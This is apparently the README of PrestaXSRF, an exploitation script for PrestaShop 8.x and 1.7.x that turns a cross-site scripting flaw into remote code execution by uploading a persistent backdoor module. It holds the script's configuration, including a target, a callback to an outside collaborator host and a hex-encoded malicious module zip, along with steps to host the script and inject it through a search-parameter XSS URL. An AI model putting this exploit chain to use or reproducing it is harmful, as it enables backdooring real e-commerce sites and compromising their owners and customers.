
<h1 align="center">
  <br>
  <img src="https://github.com/nowak0x01/PrestaXSRF/assets/96009982/9af2d46c-95e5-41e7-b983-2351b2c23af8" alt="PrestaXSRF" width="300">
</h1>

<h4 align="center">PrestaShop Exploitation Script that elevate XSS to RCE or Others Critical Vulnerabilities</a>.</h4>

<p align="center">
  <a href="#about">About</a>  -
  <a href="#key-features">Key Features</a>  -
  <a href="#installation">Installation</a>  -
  <a href="#examples">Examples</a>  -
  <a href="#contributing">Contributing</a>
</p>

![prestaxsrf](https://github.com/nowak0x01/PrestaXSRF/assets/96009982/34e151d0-250d-4eff-ab96-4e6ece1ad163)

## About
_**PrestaXSRF**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in PrestaShop E-Commerce. <br><br>
🐧 **This script provides support for **PrestaShop** **Versions** **8.X.X** and **1.7.X.X**.**
<br>

## Key Features

* _**(RCE) PSUploadModule(); - Upload a custom Module**_
  - Upload a Persistent Module (backdoor) to PrestaShop.
* _**// Pending**_
  - more ways to get RCE
  

## Installation

**1\) Clone the Repository**
```bash
git clone https://github.com/nowak0x01/PrestaXSRF
```

**2\) Edit the script by selecting the desired function and modifying its variable values.** (Example: _**PSUploadModule**_)
```
// ************************************ ~% Variables %~ ************************************ //

var Target = "https://checkout.example.com/"; // Ex: https://checkout.example.com/
var Callback = "http://fpplspls8k8a2cdluhe8kz8qwf.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

// PSUploadModule(); // (RCE) - Upload a Persistent Module (backdoor) to PrestaShop.

// PrestaShop 8.X.X and 1.7.X.X
function PSUploadModule() {

    // The Contents of your .zip module file encoded in Hex. (only change it if you are going to use another template than PrestaShop Analytics) -> Ex: xxd -p -c 0 [Module.zip].
    var HexFileContent = "504b03040a0000000000bda59a570000000000000000000000000a001c00616e616c79746963732f5554090003853b8b658a3b8b6575780b000104e803000004e8030000504b03040a000000000077b198577bb6117b120000001200000013001c00616e616c79746963732f696e6465782e7068705554090003a1ac8865aaac886575780b000104e803000004e80300003c3f7068700a09706870696e666f28293b0a504b030414000000080066b49857533fd85699010000d303000017001c00616e616c79746963732f616e616c79746963732e706870555409000320b288654f3b8b6575780b000104e803000004e80300008593514bc3301485dff32ba20c9b3e2813e694cd2982823ee886135f44429adcd8609794241545f6df4db7aeebec74792acd77ee39f7d09e5fe6698e909298ec09904a8320119d4ce9f3cde3f46efc40a338c6df0887039fca0fd11c219e31e7f09566d99757dc850b0f5a387c6f4491015ad27991648a635968ee95d198526eb4f3b6e09ec40b62c995a7e353e50e2f349b011ee188ad2647c3df88674949486bb4a7464ac5814a60beb0b085fe00eb4aefa0383bea1d9db60956f8d4d8129884099e4d5393b7290d20a80ae999e665c2ee10d548ce2c683f186cecd7b8af4608e5f28c7d3d2c57ac5e66a461bb2e348a5b0904386e55ee97dbace52b748eb696bec89c65adc22d84c6749dbdc6f0c141cd34dc2dbc29e7c1de1af34ea26a955b33831df685de11a0fbaf3c0d76d76b33d20979d9ccb5be1e1e1c12c6df43330973d0ef5101dc8820a093f1f4e9253a81e393fe59f4daecb504fe14c8e4b4dbebf20d85924439079ed47e655d0df7bd11dedf8f1bc12a5523df2820e17f535a9a40564fa46132df661792555665e6caa69e5a01ab26e7e807504b03040a000000000031b3985700000000000000000000000010001c00616e616c79746963732f76696577732f5554090003ddaf8865633b8b6575780b000104e803000004e8030000504b03040a000000000031b398570000000000000000000000001a001c00616e616c79746963732f76696577732f74656d706c617465732f5554090003ddaf8865653b8b6575780b000104e803000004e8030000504b03040a000000000031b398570000000000000000000000001f001c00616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f5554090003ddaf8865673b8b6575780b000104e803000004e8030000504b030414000000080031b39857267635cb45000000460000002e001c00616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f646973706c6179486f6d652e74706c5554090003ddaf8865673b8b6575780b000104e803000004e8030000abd6d2e2d2527048cbcc4955c8cd4f29cd492dd64fcc4bcca92cc94c2ed62fcb4c2d2fd62f49cd2dc8492c01ca64e4e767eba7641603b9951ef9b9a97a2505395c5ab55c00504b01021e030a0000000000bda59a570000000000000000000000000a0018000000000000001000ed4100000000616e616c79746963732f5554050003853b8b6575780b000104e803000004e8030000504b01021e030a000000000077b198577bb6117b1200000012000000130018000000000001000000a48144000000616e616c79746963732f696e6465782e7068705554050003a1ac886575780b000104e803000004e8030000504b01021e0314000000080066b49857533fd85699010000d3030000170018000000000001000000a481a3000000616e616c79746963732f616e616c79746963732e706870555405000320b2886575780b000104e803000004e8030000504b01021e030a000000000031b39857000000000000000000000000100018000000000000001000ed418d020000616e616c79746963732f76696577732f5554050003ddaf886575780b000104e803000004e8030000504b01021e030a000000000031b398570000000000000000000000001a0018000000000000001000ed41d7020000616e616c79746963732f76696577732f74656d706c617465732f5554050003ddaf886575780b000104e803000004e8030000504b01021e030a000000000031b398570000000000000000000000001f0018000000000000001000ed412b030000616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f5554050003ddaf886575780b000104e803000004e8030000504b01021e0314000000080031b39857267635cb45000000460000002e0018000000000001000000a48184030000616e616c79746963732f76696577732f74656d706c617465732f686f6f6b2f646973706c6179486f6d652e74706c5554050003ddaf886575780b000104e803000004e8030000504b0506000000000700070095020000310400000000";
    var Filename = "analytics.zip";
    var admin_endpoint = "admin365ub4qbg"; // administrator endpoint
```

**3\) Start a web server**
```bash
python3 -m http.server 80
```

**4\) Go to the PrestaShop XSS vector and include** _**prestaxsrf.js**_
```
https://checkout.example.com/search.php?s=<script%20src="//VPS/prestaxsrf.js"></script>
```

## Examples
🌧️ **_PSUploadModule()_ - Upload a Persistent Module (backdoor) to PrestaShop.**

https://github.com/nowak0x01/PrestaXSRF/assets/96009982/023d9b6e-d794-433c-84ea-8314d2f59d32

# Contributing
If you're interested in contributing, enhancing the existing code, your efforts would be immensely appreciated. Your contributions will play a key role in making this project even better.
<pre>
                                *

                         *  _|_
                         .-' * '-. *
                        /       * \
                     *  ^^^^^|^^^^^     (https://github.com/nowak0x01/PrestaXSRF)
                         .~. |  .~.              @Author: Hudson Nowak
                        / ^ \| / ^ \
                       (|   |J/|   |)
                       '\   /`"\   /`
             -- '' -'-'  ^`^    ^`^  -- '' -'-'
</pre>
